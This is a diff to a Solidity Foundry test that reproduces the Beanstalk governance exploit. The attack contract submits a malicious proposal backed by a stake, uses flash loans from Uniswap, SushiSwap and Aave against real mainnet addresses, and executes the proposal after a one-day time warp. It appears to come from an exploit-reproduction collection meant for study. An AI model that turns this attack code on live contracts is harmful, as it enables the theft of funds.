@@ -6,7 +6,7 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
 import "./Interfaces.sol";
  
-contract Beanstattack {
+contract BeanstalkAttack {
 
     IBeanStalk private constant beanstalk = IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
     IERC20 private constant bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
@@ -17,6 +17,9 @@ contract Beanstattack {
     ICurvePool private constant crvbean = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
     IERC20 private constant crv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
     ICurvePool private constant crvpool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
+
+    IUniswapV2Factory private constant sushi = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
+    IERC20 private constant lusd = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0); 
 
     function propose() external payable {
         // proposing the bip requires a stake
@@ -34,7 +37,7 @@ contract Beanstattack {
         //the proposal is just calling the entrypoint function at this contract address
         //this will be performed using a delegate call from the beanstalk silo
         IBeanStalk.FacetCut[] memory cut = new IBeanStalk.FacetCut[](0);
-        bytes memory data = abi.encodeWithSelector(Beanstattack.entrypoint.selector);
+        bytes memory data = abi.encodeWithSelector(BeanstalkAttack.entrypoint.selector);
         beanstalk.propose(cut, address(this), data, 3);
     }
     
@@ -135,9 +138,18 @@ contract Beanstattack {
 
     // Uniswap flashloan callback
     function uniswapV2Call(address, uint, uint amount, bytes calldata) external {
-        //We should check the sender if sushiswap is also used so we can change the behavior accordingly
-        //TODO: add sushiswap
-        
+        //Example of how to check for uniswap vs sushiswap: we compare the senders against the pair
+        //Sushiswap flashloans enters in the else clause, but as we don't need it we just leave the example
+        //here.
+        IUniswapV2Pair upair = IUniswapV2Pair(factory.getPair(address(bean), address(weth)));
+        if (address(upair) == msg.sender) {
+            IUniswapV2Pair spair = IUniswapV2Pair(sushi.getPair(address(lusd), address(weth)));
+            bytes memory data = abi.encodeWithSelector(spair.swap.selector, 0, 1, address(this), abi.encodePacked(uint256(1)));
+            (bool success, bytes memory ret) = address(spair).call(data);
+        } else {
+            return; //we do nothing with sushi flashloan, only leaving the example
+        }
+
         //Uniswap flashloan is not necessary for this attack.
         //It could be done with the aave flashloan only, but we leave the example here for reference
         //though the money of this flashloan is not used
@@ -174,7 +186,7 @@ contract Exploit_Beanstalk is Test {
    }
  
    function test_attack() public {
-        Beanstattack att = new Beanstattack();
+        BeanstalkAttack att = new BeanstalkAttack();
         att.propose{value: 100 ether}();
         vm.warp(block.timestamp + 1 days); //proposal can be executed now
         att.attack();
